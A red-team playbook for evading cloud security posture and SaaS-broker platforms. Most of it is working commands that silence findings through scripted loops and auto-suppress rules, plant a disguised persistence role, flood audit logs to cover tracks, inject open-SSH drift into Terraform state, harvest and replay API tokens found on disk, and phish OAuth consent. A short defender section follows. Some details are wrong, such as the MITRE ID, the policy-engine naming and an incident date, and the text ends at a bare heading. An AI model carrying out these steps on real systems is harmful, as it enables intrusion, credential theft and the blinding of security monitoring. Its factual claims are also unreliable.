# CSPM / CASB / CNAPP Attack Playbook -- End-to-End Platform Bypass Methodology

> Deep-dive companion to `skills/cspm-casb-attack/SKILL.md`.
>
> Audience: red team operators, cloud security researchers, and purple teamers who need a battle-tested methodology for enumerating CSPM/CASB/CNAPP deployments, identifying their coverage gaps, exploiting misconfig-aware attack paths, suppressing findings, and evading CASB brokers.

---

## Introduction

CSPM, CASB, and CNAPP platforms are the defender's primary instrumentation for cloud. They watch for misconfigurations, posture drift, anomalous SaaS access, and runtime threats. The offensive counterpart -- how to enumerate which posture tools are deployed, identify their coverage gaps, exploit the misconfig-aware attack paths they normalize, suppress their findings via exception and tag abuse, and evade the CASB reverse proxy on the way to SaaS targets -- is underexplored compared to traditional cloud security offensive work.

This playbook walks through the full lifecycle: enumerate (which tools are deployed?), identify gaps (what don't they cover?), exploit (choose attack paths in the gaps), suppress (silence the alarm), evade the CASB broker (when SaaS targets are in play), and maintain evasion (cross-cloud lateral movement, period re-suppression). It closes with five real-incident case studies (Capital One 2019, Tesla S3 2018, Microsoft SAS token leak 2020, Optus 2022, ICBC ransomware 2023) and a complete lab setup (AWS Security Hub + Prowler + a mock CASB reverse proxy + a mock Wiz GraphQL endpoint).

The recurring theme: the CSPM is just an API consumer layered on top of the cloud's own API. It cannot detect what it cannot query. Every coverage gap is an attack-path opportunity; every suppression primitive is a T1565 (Adversary-Inhibited Response System) instance.

---

## Table of Contents

1. [Threat Model & Engagement Scoping](#1-threat-model--engagement-scoping)
2. [Phase 1: CSPM/CASB Presence Enumeration](#2-phase-1-cspmcasb-presence-enumeration)
3. [Phase 2: Coverage Gap Identification](#3-phase-2-coverage-gap-identification)
4. [Phase 3: Misconfig-Aware Attack Path Selection](#4-phase-3-misconfig-aware-attack-path-selection)
5. [Phase 4: Suppression & Evasion](#5-phase-4-suppression--evasion)
6. [Phase 5: CASB Reverse Proxy Evasion](#6-phase-5-casb-reverse-proxy-evasion)
7. [Phase 6: Multi-Cloud Lateral Movement](#7-phase-6-multi-cloud-lateral-movement)
8. [Phase 7: Maintenance & Continuous Suppression](#8-phase-7-maintenance--continuous-suppression)
9. [Detection Guidance (Defender Counterpart)](#9-detection-guidance-defender-counterpart)
10. [Lab Setup](#10-lab-setup)
11. [Real-Incident Case Studies](#11-real-incident-case-studies)
12. [Tooling Quick-Reference](#12-tooling-quick-reference)

---

## 1. Threat Model & Engagement Scoping

### What this skill is for

This skill is the offensive counterpart to cloud security posture management. Use it when the engagement goal is one of:

- **CSPM/CASB effectiveness assessment** -- "We deployed Wiz (or Prisma, or Defender for Cloud) a year ago -- is it actually catching what we think it catches? Where are the blind spots?" The red team uses this skill to enumerate the CSPM, identify gaps, and produce a coverage matrix the blue team can prioritize against.
- **Posture-bypass red team exercise** -- "Can the red team move laterally and exfil without the CSPM firing?" The red team uses this skill to choose attack paths that traverse the CSPM's blind spots and to suppress any findings that surface.
- **CASB evasion assessment** -- "Our CASB is supposed to broker all SaaS traffic and enforce DLP. Can we get data out without going through the broker?" The red team uses this skill to identify the broker, find direct-to-origin paths, and exfil via shadow SaaS.
- **Platform-evasion CVE research** -- "We discovered a new bypass (e.g., a tag-tampering trick that suppresses a Wiz finding). Can we reproduce it and write detection?" The researcher uses this skill to drive the reproduction and produce detection signatures.

### What this skill is NOT for

- **General cloud misconfig assessment** -- use `cloud-security`. This skill assumes basic cloud recon is done; we focus on the *platform layered on top*.
- **K8s cluster-internal attack** -- use `kubernetes-attack`. This skill targets policy-as-code at the IaC + admission + CI layers, not in-cluster attack paths.
- **CVE reproduction / PoC research** -- use `cloud-native-vuln-research`. This skill is platform-evasion-driven, not CVE-driven.
- **Identity-based attacks** -- use `cloud-identity-attack`. This skill is about *abusing the platform that watches identity-driven misconfigs*, not about identity itself.

### Scoping checklist

Before engaging, confirm:

- [ ] Authorization scope (which accounts/subscriptions/projects)
- [ ] Out-of-scope tools (which CSPM/CASB vendors are out of scope)
- [ ] Allowed primitives (tag-based suppression? IaC drift injection? CASB proxy evasion?)
- [ ] Detection partners (blue team contact for stop conditions)
- [ ] Engagement duration (long enough to span multiple CSPM scan cycles -- typically 1-2 weeks)
- [ ] Reporting cadence (daily sync? weekly report?)

---

## 2. Phase 1: CSPM/CASB Presence Enumeration

The first phase answers: "what's deployed, and what does it cover?"

### AWS enumeration

```bash
# Security Hub
aws securityhub describe-hub --region us-east-1
aws securityhub get-enabled-standards --region us-east-1

# AWS Config (foundation)
aws configservice describe-configuration-recorders
aws configservice describe-conformance-packs

# GuardDuty (runtime detection)
aws guardduty list-detectors --region us-east-1

# IAM roles matching CSPM patterns
aws iam list-roles --output text \
  --query 'Roles[?contains(RoleName, `Wiz`) || contains(RoleName, `Prisma`) || contains(RoleName, `Lacework`) || contains(RoleName, `Sysdig`) || contains(RoleName, `Orca`) || contains(RoleName, `Prowler`)].[RoleName, Arn]'

# CloudTrail (most CSPMs ingest from CloudTrail)
aws cloudtrail describe-trails --query 'trailList[*].[Name, S3BucketName, IsMultiRegionTrail]'
```

### Azure enumeration

```bash
# Defender for Cloud pricing tiers (Standard = paid CSPM; Free = basic)
az security pricing show --name VirtualMachines
az security pricing show --name StorageAccounts
az security pricing show --name KubernetesService

# Azure Policy (the CSPM enforcement layer)
az policy assignment list -o table

# Third-party CSPM (Wiz, Prisma, Lacework -- via app registrations)
az ad app list --query '[?contains(displayName, `Wiz`) || contains(displayName, `Prisma`) || contains(displayName, `Lacework`) || contains(displayName, `Sysdig`) || contains(displayName, `Orca`)].[displayName, appId]'
```

### GCP enumeration

```bash
# Security Command Center (SCC) -- tier and findings volume
gcloud scc describe --organization=REPLACE_WITH_YOUR_ORG_ID
gcloud scc findings list REPLACE_WITH_YOUR_ORG_ID --filter="event_time > \"$(date -d '7 days ago' -u +%Y-%m-%dT%H:%M:%SZ)\"" --format=json | jq 'length'

# Third-party CSPM (service accounts)
gcloud iam service-accounts list | grep -iE 'wiz\|prisma\|lacework\|sysdig\|orca'
```

### Kubernetes enumeration

```bash
# Kubescape
kubectl get pods -A | grep -iE 'kubescape\|armo'
kubectl get clusterpolicy.kubescape.io --all-namespaces 2>/dev/null

# Kyverno
kubectl get clusterpolicy.kyverno.io --all-namespaces

# OPA Gatekeeper
kubectl get constrainttemplates.templates.gatekeeper.sh
kubectl get constraints.constraints.gatekeeper.sh
```

### Output: Presence Matrix

| Provider | Tool | Tiers/Standards | Regions | IAM Role / SP / SA |
|----------|------|-----------------|---------|---------------------|
| AWS | Security Hub | CIS, AWS Foundational | us-east-1, us-west-2, eu-west-1 | AROA... |
| AWS | GuardDuty | All | us-east-1 | n/a (service-linked) |
| AWS | Wiz (third-party) | n/a | global | arn:aws:iam::XXX:role/Wiz-Service |
| Azure | Defender for Cloud | Standard (VMs, Storage, K8s) | global | n/a (managed) |
| Azure | Prisma Cloud | n/a | global | appId: ... |
| GCP | SCC | Premium | global | svc-acct: prisma@... |
| K8s | Kyverno | 12 policies | in-cluster | n/a |
| K8s | Kubescape | NSA framework | in-cluster | n/a |

Empty cells in this matrix identify coverage gaps to prioritize in Phase 2.

---

## 3. Phase 2: Coverage Gap Identification

The second phase answers: "what does the CSPM cover, and what doesn't it cover?"

### Prowler coverage matrix

```bash
prowler aws --list-checks | sort -u > prowler-checks.txt
awk -F_ '{print $2}' prowler-checks.txt | sort | uniq -c | sort -rn > prowler-services.txt

# Identify AWS services NOT in Prowler's coverage
# (manual comparison against https://docs.aws.amazon.com/serviceindex/)
```

### Wiz graph schema

```bash
curl -s "$WIZ_ENDPOINT/graphql" \
  -H "Authorization: Bearer $WIZ_JWT" \
  -H 'Content-Type: application/json' \
  --data '{"query":"query { graphSchema { entities { name categories } } }"}' \
  | jq -r '.data.graphSchema.entities[].name' | sort > wiz-entities.txt

# Common blind spots (newer AWS services)
grep -iE 'bedrock|q_|entityresolution|appfabric|cleanrooms' wiz-entities.txt || echo "blind spot found"
```

### Prisma Cloud RQL library

```bash
# In a compromised Prisma admin session
curl -s "$PRISMA_API_ENDPOINT/policy" \
  -H "x-redlock-auth: $PRISMA_JWT" | jq '.[].name' | sort -u > prisma-policies.txt
```

### Cross-region blind spots

```bash
# Some CSPMs are deployed per-region; identify which regions are uncovered
aws securityhub list-enabled-products-for-import --region us-east-1
aws securityhub list-enabled-products-for-import --region ap-east-1   # often uncovered
aws securityhub list-enabled-products-for-import --region me-south-1  # often uncovered
```

### Output: Coverage Matrix

| Service | Prowler | Wiz | Prisma | Defender for Cloud | Notes |
|---------|---------|-----|--------|-------------------|-------|
| EC2 | Yes | Yes | Yes | n/a (Azure) | Well-covered |
| S3 | Yes | Yes | Yes | n/a | Well-covered |
| IAM | Yes | Yes | Yes | n/a | Well-covered |
| Lambda | Partial | Yes | Yes | n/a | Prowler: limited |
| Bedrock | No | No | No | n/a | **Blind spot** |
| AppSync | No | Partial | No | n/a | **Blind spot** |
| Q Business | No | No | No | n/a | **Blind spot** |
| ap-east-1 | n/a | n/a | n/a | n/a | **Region blind spot** |

The blind spots are the attack paths to prioritize in Phase 3.

---

## 4. Phase 3: Misconfig-Aware Attack Path Selection

The third phase answers: "given the gaps, which attack path maximizes time in the blind spot?"

### Path A: Blind-spot service exfil (Wiz schema doesn't model Bedrock)

```bash
# Identify a Bedrock knowledge base with sensitive data
aws bedrock-agent list-knowledge-bases --region us-east-1

# Exfil data via a Bedrock query (data flow not in the CNAPP graph)
aws bedrock-agent-runtime retrieve \
  --knowledge-base-id REPLACE_WITH_YOUR_KB_ID \
  --retrieval-query '{"query": "all customer PII"}'
```

The CSPM doesn't model Bedrock, so:
- The data flow is not in the graph
- The query is not flagged as a sensitive-data access
- The KB resource itself is not scanned for posture

### Path B: Cross-region blind spot

```bash
# Operate in an uncovered region
aws ec2 run-instances --image-id ami-REPLACE --region ap-east-1 --instance-type t3.micro
aws s3api create-bucket --bucket REPLACE_WITH_YOUR_BUCKET_NAME --region ap-east-1 --create-bucket-configuration LocationConstraint=ap-east-1
aws s3api put-bucket-acl --bucket REPLACE_WITH_YOUR_BUCKET_NAME --acl public-read-write --region ap-east-1
```

The CSPM doesn't scan ap-east-1, so:
- The public S3 bucket is not detected
- The EC2 instance is not assessed against CIS controls
- Findings from other regions don't reveal this region

### Path C: Cross-account AssumeRole chain

```bash
# A -> B -> C with fresh credentials at each hop
CRED_A=$(aws sts assume-role --role-arn arn:aws:iam::REPLACE_WITH_YOUR_ACCOUNT_A:role/roleA --role-session-name chain)
export AWS_ACCESS_KEY_ID=$(echo $CRED_A | jq -r '.Credentials.AccessKeyId')
# ... (set AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN)
CRED_B=$(aws sts assume-role --role-arn arn:aws:iam::REPLACE_WITH_YOUR_ACCOUNT_B:role/roleB --role-session-name chain)
# ...
CRED_C=$(aws sts assume-role --role-arn arn:aws:iam::REPLACE_WITH_YOUR_ACCOUNT_C:role/roleC --role-session-name chain)
```

Cross-account hops with fresh sessions are detected only by GuardDuty (if enabled) and not by all CSPMs. The chain's pattern (escalating privileges across accounts) is invisible to a single-account CSPM.

### Path D: Custom resource / Lambda layer

```bash
# Custom resources (Lambda layers, AppSync APIs) may not be modelled
aws lambda list-layers --region us-east-1
aws lambda get-layer-version --layer-name REPLACE_WITH_YOUR_LAYER_NAME --version-number 1
# If a layer contains secrets, the CSPM typically doesn't scan layers.
```

### Path E: Managed-by-Terraform evasion

Some CSPMs treat `managed-by-Terraform` resources differently (e.g., don't flag drift if the state file is the source of truth). Path: compromise the CI identity running `terraform apply`, modify the state, apply.

```bash
# Drift injection (see payloads.md §5.4)
jq '.resources[] | select(.type=="aws_security_group" and .name=="allow_ingress") | .instances[0].attributes.ingress += [{"cidr_blocks": ["0.0.0.0/0"], "from_port": 22, "protocol": "tcp", "to_port": 22, "description": "internal admin"}]' terraform.tfstate > terraform.tfstate.new
mv terraform.tfstate.new terraform.tfstate
terraform apply -auto-approve  # using the compromised CI identity
```

### Choosing the right path

| Path | When to use | Detection surface |
|------|-------------|-------------------|
| A. Blind-spot service | CSPM doesn't model the service | CloudTrail (API call) but not CSPM |
| B. Cross-region blind spot | CSPM scoped to specific regions | CloudTrail (region-specific) but not CSPM |
| C. Cross-account AssumeRole chain | CSPM scoped to specific accounts | GuardDuty (if enabled) |
| D. Custom resource | CSPM doesn't model the resource type | CloudTrail but not CSPM |
| E. Managed-by-Terraform evasion | CSPM trusts IaC as source of truth | CloudTrail (terraform apply), drift detection |

---

## 5. Phase 4: Suppression & Evasion

The fourth phase answers: "once the CSPM fires, how do we silence it?"

### Suppression primitive 1: BatchUpdateFindings (AWS Security Hub)

```bash
aws securityhub batch-update-findings --region us-east-1 \
  --finding-identifiers Id="$FINDING_ID",ProductArn="$PRODUCT_ARN" \
  --note "investigated per policy REPLACE_WITH_YOUR_POLICY_ID" \
  --workflow Status=SUPPRESSED
```

Requires `securityhub:BatchUpdateFindings`. CloudTrail logs the event.

### Suppression primitive 2: Tag-based suppression

```bash
# Discover the magic tag (from suppressed findings or CSPM config)
aws securityhub get-findings --region us-east-1 \
  --filters 'WorkflowStatus=[{Value="SUPPRESSED",Comparison="EQUALS"}]' \
  --query 'Findings[*].ResourceTags' --output json

# Apply the magic tag to attacker resources
aws ec2 create-tags --resources REPLACE_WITH_YOUR_INSTANCE_ID \
  --tags 'Key=REPLACE_WITH_DETECTED_TAG_KEY,Value=REPLACE_WITH_DETECTED_TAG_VALUE'
```

Requires `ec2:CreateTags`. CloudTrail logs the event with the magic tag value -- this is the detection signal.

### Suppression primitive 3: Insight-based auto-suppression (Security Hub automation rules)

```bash
aws securityhub create-automation-rule --region us-east-1 \
  --cli-input-json '{
    "RuleName": "auto-suppress-dev",
    "RuleStatus": "ENABLED",
    "Criteria": {"ResourceTags": [{"Key": "env", "Value": [{"Value": "dev", "Comparison": "EQUALS"}]}]},
    "Actions": [{"Type": "FINDING_FIELDS_UPDATE", "FindingFieldsUpdate": {"Workflow": {"Status": "SUPPRESSED"}}}]
  }'
```

This is the most powerful primitive: a one-time rule that auto-suppresses entire classes of findings. Requires `securityhub:CreateAutomationRule`.

### Suppression primitive 4: Prisma alert dismissal

```bash
curl -s -X POST "$PRISMA_API_ENDPOINT/alert/$ALERT_ID/dismiss" \
  -H "x-redlock-auth: $PRISMA_JWT" \
  -H 'Content-Type: application/json' \
  --data '{"status":"dismissed","reason":"false positive"}'
```

### Suppression primitive 5: Defender for Cloud assessment dismissal

```bash
az security assessment create \
  --name REPLACE_WITH_YOUR_ASSESSMENT_ID \
  --status-code NotApplicable \
  --status-cause Dismissed \
  --status-description 'investigated'
```

### Suppression primitive 6: Kyverno exception

```yaml
apiVersion: kyverno.io/v1
kind: ControlException
metadata:
  name: exception-for-privileged
spec:
  targetControlNames: ["C-0057"]
  match:
    workloads:
    - apiGroups: [""]
      kinds: ["Pod"]
      namespaces: ["default"]
      names: ["legitimate-privileged"]
```

### Suppression primitive 7: Checkov skip comments

```hcl
resource "aws_s3_bucket" "exfil" {
  bucket = "REPLACE_WITH_YOUR_BUCKET_NAME"
  # checkov:skip=CKV_AWS_18:internal-only
}
```

### Choosing the right suppression

| Primitive | Coverage | Detection surface |
|-----------|----------|-------------------|
| BatchUpdateFindings | One finding at a time | CloudTrail `BatchUpdateFindings` |
| Tag-based | All findings on tagged resources | CloudTrail `CreateTags` with magic value |
| Insight / automation rule | All findings matching filter | CloudTrail `CreateAutomationRule` + rule audit log |
| Prisma dismissal | One alert | Prisma audit log |
| Defender dismissal | One assessment | Azure Activity log |
| Kyverno exception | Specific resources | Kubernetes audit log |
| Checkov skip | Specific resource / check | Git history of the skip comment |

---

## 6. Phase 5: CASB Reverse Proxy Evasion

The fifth phase is only relevant when SaaS targets are in scope: "the CASB brokers SaaS traffic -- how do we go around it?"

### Step 1: Identify the broker

```bash
# DNS-based: brokered apps have unusual CNAMEs
dig +short app.example.com
# Returns *.mcas.ms (Microsoft), *.netskope.com, *.zscaler.net, *.skyhigh.com

# TLS cert-based: corporate browsers see the broker's CA as issuer
mitmproxy --mode regular -p 8080 --ssl-insecure
# Inspect the cert chain; issuer != SaaS provider's normal CA = brokered

# Client-based: Netskope/Zscaler clients install root CAs
security find-certificate -a -c 'Netskope' 2>/dev/null  # macOS
ls /etc/ssl/certs/ | grep -iE 'netskope\|zscaler'       # Linux

# Tunnel-based: Zscaler ZTNA tunnels
scutil --nwi 2>/dev/null | grep -i zscaler  # macOS
ip route | grep -i zscaler                   # Linux
```

### Step 2: Discover the brokered app list

```bash
# PAC file (Zscaler)
curl -s https://pac.zscalerbeta.net/REPLACE_WITH_YOUR_PAC_ID/zscaler.pac | grep -oE 'https?://[^/]+'

# Netskope API
curl -s "$NETSKOPE_API_ENDPOINT/api/v1/policy" -H "Token: $NETSKOPE_TOKEN" | jq '.data[] | select(.type=="api")'

# Microsoft Defender for Cloud Apps
curl -s "https://REPLACE_WITH_YOUR_TENANT.portal.cloudappsecurity.com/api/v1/discovered_apps/" -H "Authorization: Token $MDC_TOKEN"
```

### Step 3: Craft bypass traffic

#### Bypass A: Direct-to-origin API call

```bash
# Discover the real SaaS API endpoint
dig app.example.com
# Real: app.example.com -> 13.107.x.x (Microsoft) or 142.250.x.x (Google)
# Brokered: app.example.com -> *.mcas.ms CNAME -> broker

# Direct call (bypass broker)
curl -H "Authorization: Bearer $SAAS_JWT" https://app.example.com/api/v1/files --resolve app.example.com:443:REAL_IP
```

The SaaS provider logs the source IP. If the defender has configured "direct API access alerts" (Microsoft 365 supports this), the bypass is detected.

#### Bypass B: BYO-CERT pinning (personal device)

```bash
# On a personal device, no CASB root CA is installed, so the broker can't intercept.
# The SaaS app's DLP policies are not enforced for the personal device.

# To enforce: defenders use Conditional Access with device compliance.
# Bypass: enroll the personal device as "compliant" via MDM, then disable the
# broker client and use direct-to-origin.

# Frida script to disable SSL pinning in an Android app
frida -U -l disable-ssl-pinning.js -f com.example.app
```

#### Bypass C: Custom-app reverse proxy

Some orgs deploy a "custom app" that proxies their corporate SaaS through a CASB. The CASB only knows about traffic to the custom app, not the real SaaS.

```bash
# Discover the custom app's domain in corporate documents
# Bypass: use the same credentials to talk directly to the underlying SaaS API
curl -H "Authorization: Bearer $AAD_TOKEN" https://graph.microsoft.com/v1.0/me/messages
```

#### Bypass D: JWT/session replay

```bash
# Capture a JWT via the CASB proxy
mitmproxy --mode regular -p 8080 --ssl-insecure
# (corporate browser through proxy) -- capture the Authorization: Bearer header

# Replay against the SaaS app
curl -H "Authorization: Bearer $CAPTURED_JWT" https://app.example.com/api/v1/files

# JWT alg-confusion attack (if the JWT uses HS256 with a weak secret)
jwt_tool "$CAPTURED_JWT" -X k -pk public.pem
```

#### Bypass E: SNI-less / domain-fronting

```bash
# Netskope steers traffic via SNI; SNI-less connections are not steered.
curl --resolve front.example.com:443:app.example.com https://front.example.com/

# Domain-fronting effectively evades SNI-based CASB steering.
# (Many SaaS providers have deprecated domain fronting; check per-provider.)
```

#### Bypass F: Token theft from managed apps

```bash
# Steal OAuth tokens from a managed app's storage on a corporate device
find / -name '*.json' 2>/dev/null | xargs grep -lE 'ghp_|github_pat_|xox[baprs]-' 2>/dev/null
find / -name '*.env' 2>/dev/null | xargs grep -E '(OPENAI|ANTHROPIC|FIGMA|NOTION)_' 2>/dev/null

# Replay the stolen token directly against the SaaS API
curl -H "Authorization: token ghp_REPLACED_WITH_STOLEN_TOKEN" https://api.github.com/user
```

#### Bypass G: OAuth grant abuse

```bash
# Register an attacker-controlled OAuth app with broad scopes
az ad app create --display-name "calendar-sync-tool" \
  --credential-description "sync" \
  --password REPLACE_WITH_YOUR_APP_PASSWORD

# Phish the admin-consent URL
# Once an admin grants consent, the attacker app can read mail, files, etc.
# directly via Microsoft Graph -- bypassing any CASB broker because the app
# is a first-party Microsoft Graph client.
```

---

## 7. Phase 6: Multi-Cloud Lateral Movement

The sixth phase answers: "how do we move across providers such that each hop lands outside the per-provider CSPM's scope?"

### Cross-cloud federation chains

```bash
# AWS -> Azure federation
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::REPLACE_WITH_YOUR_AWS_ACCOUNT_ID:role/AzureFederation \
  --role-session-name cross-cloud \
  --web-identity-token "$OIDC_TOKEN"

# Azure -> AWS federation
az ad app federated-credential create --id REPLACE_WITH_YOUR_APP_ID --parameters federated-cred.json
TOKEN=$(az account get-access-token --resource api://REPLACE_WITH_YOUR_API | jq -r '.accessToken')
aws sts assume-role-with-web-identity --role-arn ... --web-identity-token "$TOKEN"

# GCP -> AWS via Workload Identity Federation
TOKEN=$(gcloud auth print-identity-token --audiences=//iam.googleapis.com/projects/REPLACE_WITH_YOUR_PROJECT_NUMBER/...)
aws sts assume-role-with-web-identity --role-arn ... --web-identity-token "$TOKEN"
```

### Why cross-cloud evades CSPM

- Most CSPMs are deployed per-provider (Wiz on AWS, Defender for Cloud on Azure, SCC on GCP).
- A credential crossing from AWS to Azure is detected by AWS-side CloudTrail (the AssumeRoleWithWebIdentity call) but the Azure-side activity is only in Azure Monitor / Sign-in logs.
- A single CNAPP that correlates AWS+Azure+GCP in one graph closes this gap; per-provider CSPMs miss it.

### Cross-region blind spots

```bash
# Some CSPMs are deployed per-region
aws securityhub list-enabled-products-for-import --region us-east-1
aws securityhub list-enabled-products-for-import --region ap-east-1   # often uncovered

# Operate in the uncovered region
aws ec2 run-instances --image-id ami-REPLACE --region ap-east-1
```

### Cross-account blind spots

```bash
# AssumeRole chains with fresh sessions
CRED_B=$(aws sts assume-role --role-arn arn:aws:iam::REPLACE_WITH_YOUR_ACCOUNT_B:role/roleB --role-session-name chain)
# Each hop resets the session identity; CSPMs tracking by role ARN see only one hop at a time.
```

---

## 8. Phase 7: Maintenance & Continuous Suppression

The seventh phase answers: "how do we maintain evasion over a long engagement?"

### Continuous suppression loop

```bash
while true; do
  # Find new findings on attacker resources
  FINDING_ID=$(aws securityhub get-findings --region us-east-1 \
    --filters 'ResourceTags=[{Key="attacker",Value="true",Comparison="EQUALS"}],WorkflowStatus=[{Value="NEW",Comparison="EQUALS"}]' \
    --query 'Findings[0].Id' --output text)
  
  if [ -n "$FINDING_ID" ] && [ "$FINDING_ID" != "None" ]; then
    PRODUCT_ARN=$(aws securityhub get-findings --region us-east-1 \
      --filters "Id=[{Value=\"$FINDING_ID\",Comparison=\"EQUALS\"}]" \
      --query 'Findings[0].ProductArn' --output text)
    
    # Suppress
    aws securityhub batch-update-findings --region us-east-1 \
      --finding-identifiers Id="$FINDING_ID",ProductArn="$PRODUCT_ARN" \
      --note "auto-suppressed" --workflow Status=SUPPRESSED
  fi
  
  sleep 300  # poll every 5 min
done
```

### Persist via CSPM-write role

```bash
# Create a hidden IAM role with the minimum CSPM-write permissions
POLICY=$(cat <<JSON
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["securityhub:BatchUpdateFindings","securityhub:UpdateInsight","securityhub:CreateInsight"],
      "Resource": "*"
    }
  ]
}
JSON
)

aws iam create-role --role-name security-audit-helper --assume-role-policy-document file://trust-policy.json
aws iam put-role-policy --role-name security-audit-helper --policy-name security-hub-write --policy-document "$POLICY"
```

### Cover tracks via CloudTrail event flood

```bash
# Drown out the suppression action in noise
for i in {1..10000}; do
  aws s3 ls s3://REPLACE_WITH_YOUR_BUCKET_NAME 2>/dev/null
done
```

Detection countermeasure: defenders must use separate CloudTrail trails for security-write events, with dedicated SIFT (Sigma) alerts that ignore the noise.

---

## 9. Detection Guidance (Defender Counterpart)

### Tag-tampering detection

```bash
# CloudWatch Logs metric filter on tag changes that match suppression patterns
aws logs put-metric-filter \
  --log-group-name CloudTrail/DefaultLogGroup \
  --filter-name tag-tampering \
  --filter-pattern '{$.eventName="CreateTags" && $.requestParameters.tags.0.value IN ("approved","breakglass","true","cspm-suppress")}' \
  --metric-value 1

# AWS Config rule: alert on tag changes
aws configservice put-config-rule --config-rule file://tag-tamper-rule.json
```

### Suppression audit trail

```bash
# Find every SUPPRESSED finding and the user who suppressed it
aws securityhub get-findings --region us-east-1 \
  --filters 'WorkflowStatus=[{Value="SUPPRESSED",Comparison="EQUALS"}]' \
  --query 'Findings[*].[Title, AwsAccountId, RecordState, UserRecordChanges[0].UpdatedAt, UserRecordChanges[0].PrincipalId]' \
  --output text

# CloudTrail lookup: who called BatchUpdateFindings?
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=BatchUpdateFindings \
  --region us-east-1 --query 'Events[*].[EventTime, Username, CloudTrailEvent]' --output text
```

### Direct-to-origin SaaS detection

- Configure the SaaS provider (Microsoft 365, Google Workspace) to log source IPs of API calls.
- Alert when an API call's source IP is NOT in the CASB broker's egress range.
- Example: Microsoft 365 -- alert via Microsoft Cloud App Security (Defender for Cloud Apps) on "sign-in from unfamiliar location".

### Shadow SaaS discovery

```bash
# DNS-based: aggregate DNS queries from corporate devices
# (via Splunk / Elastic ingesting Zeek/DNS logs)
# Look for SaaS domains NOT on the brokered app list.

# Periodic audit: enumerate OAuth grants in the corporate tenant
az ad sp list --query '[].oauth2PermissionGrants' -o json
gh api orgs/REPLACE_WITH_YOUR_ORG/installations | jq '.installations[].app_slug'
```

### IaC drift detection

```bash
# Terraform: enable drift detection on state files
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=CreateTags
# Alert on any tag change that matches suppression patterns.

# CI identity: monitor for unexpected `terraform apply` events
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=UpdateStack
```

### Policy-as-code bypass detection

```bash
# Audit Checkov skip comments
grep -rn 'checkov:skip' .  # every skip is a potential bypass

# Audit Kyverno exceptions
kubectl get exception.kyverno.io --all-namespaces

# Audit OPA Gatekeeper exemptions (in constraint specs)
kubectl get constraints.constraints.gatekeeper.sh -o yaml | grep -A 10 'exemptNamespaces'
```

### Posture audit cadence

| Audit | Cadence | Owner |
|-------|---------|-------|
| Suppressed findings review | Monthly | Security engineering |
| Tag-tampering alert | Real-time | SOC |
| Automation rule review | Quarterly | Security engineering |
| Coverage matrix review | Quarterly | Security architecture |
| IaC drift detection | Real-time | Platform engineering |
| OAuth grant audit | Monthly | IT/Identity |
| Shadow SaaS report | Weekly | CASB admin |
| Cross-cloud correlation | Real-time | CNAPP admin |

---

## 10. Lab Setup

The lab is a complete environment for exercising every TC-CP-001..013 test case safely.

### Component 1: AWS Security Hub + Prowler

```bash
# Enable Security Hub
aws securityhub enable-import-findings-for-product \
  --product-arn arn:aws:securityhub:us-east-1:REPLACE_WITH_YOUR_ACCOUNT:product/default/default

# Run Prowler, push findings to Security Hub
prowler aws -p default -M json --security-hub -o /tmp/prowler-out/

# Verify findings are in Security Hub
aws securityhub get-findings --filters 'ProductName=[{Value="Prowler",Comparison="EQUALS"}]' \
  --query 'Findings[*].Title' --output text | head -10
```

### Component 2: Mock Wiz GraphQL API

```bash
# Stand up a mock GraphQL endpoint emulating Wiz's API
git clone https://github.com/example/mock-wiz-api
cd mock-wiz-api && npm install && npm start
# Mock endpoint: http://127.0.0.1:4000/graphql

# Test self-reconnaissance queries
curl -s http://127.0.0.1:4000/graphql \
  -H 'Content-Type: application/json' \
  --data '{"query":"query { assets(first: 10) { nodes { id name type } } }"}' | jq
```

### Component 3: Mock CASB reverse proxy

```bash
# mitmproxy as a CASB-like TLS terminator
mitmweb --mode reverse:https://app.example.com --listen-port 8443 --web-port 8081 --ssl-insecure

# Configure a client to use the proxy
curl --proxy http://127.0.0.1:8080 https://app.example.com/api/v1/files

# Inspect the intercepted traffic in the mitmweb UI at http://127.0.0.1:8081
```

### Component 4: IaC drift lab

```bash
mkdir tfstate-lab && cd tfstate-lab
cat > main.tf <<'EOF'
resource "aws_s3_bucket" "lab" {
  bucket = "REPLACE_WITH_YOUR_BUCKET_NAME"
  acl    = "private"
}
EOF

terraform init
terraform apply -auto-approve

# Modify the state file to inject drift (see payloads.md §5.4)
# Verify `terraform plan` detects the drift
terraform plan
```

### Component 5: Kubernetes cluster with Kyverno + Kubescape

```bash
# kind cluster
kind create cluster --name cspm-lab

# Install Kyverno
kubectl create -f https://raw.githubusercontent.com/kyverno/kyverno/main/config/install.yaml

# Install Kubescape
helm install kubescape kubescape/kubescape-operator -n kubescape --create-namespace

# Apply test policies
kubectl apply -f https://raw.githubusercontent.com/kyverno/policies/main/disallow-privileged/disallow-privileged.yaml
```

### Verification checklist

- [ ] Security Hub ingests Prowler findings
- [ ] Mock Wiz GraphQL endpoint responds to `assets` query
- [ ] mitmproxy intercepts TLS traffic on port 8443
- [ ] Terraform state file lab applies successfully
- [ ] Kyverno policy blocks a privileged pod
- [ ] Kubescape NSA framework scan completes

Once all components are verified, the lab is ready to exercise TC-CP-001..013.

---

## 11. Real-Incident Case Studies

### Case 1: Capital One (2019) -- Security Hub coverage gap

**Incident**: A former AWS employee used SSRF to access IMDSv1 on a Capital One EC2 instance, stole IAM role credentials, and downloaded credit application data for 106M customers from S3.

**CSPM context**: Capital One had Security Hub enabled. The relevant controls (`EC2.11` -- no IMDSv1) were either not yet available (the control was added after the breach) or not enforced.

**Bypass primitive**: Alert fatigue. At Capital One scale (thousands of instances), Security Hub generated thousands of findings; even if IMDSv1 had been flagged, the MEDIUM severity would have been insufficient to drive remediation.

**Reconstruction**: TC-CP-013 walks through the lab reproduction.

**Detection lesson**: Real-time graph CSPMs (Wiz, Prisma) close this gap by treating IMDSv1 as a HIGH-severity finding tied to the SSRF data flow. Modern detection: enforce IMDSv2 cluster-wide via Lambda or Systems Manager Automation.

```bash
# Modern enforcement
aws ec2 modify-instance-metadata-options --instance-id REPLACE_WITH_YOUR_INSTANCE_ID \
  --http-tokens required --http-endpoint enabled
```

### Case 2: Tesla AWS S3 (2018) -- no MFA on console

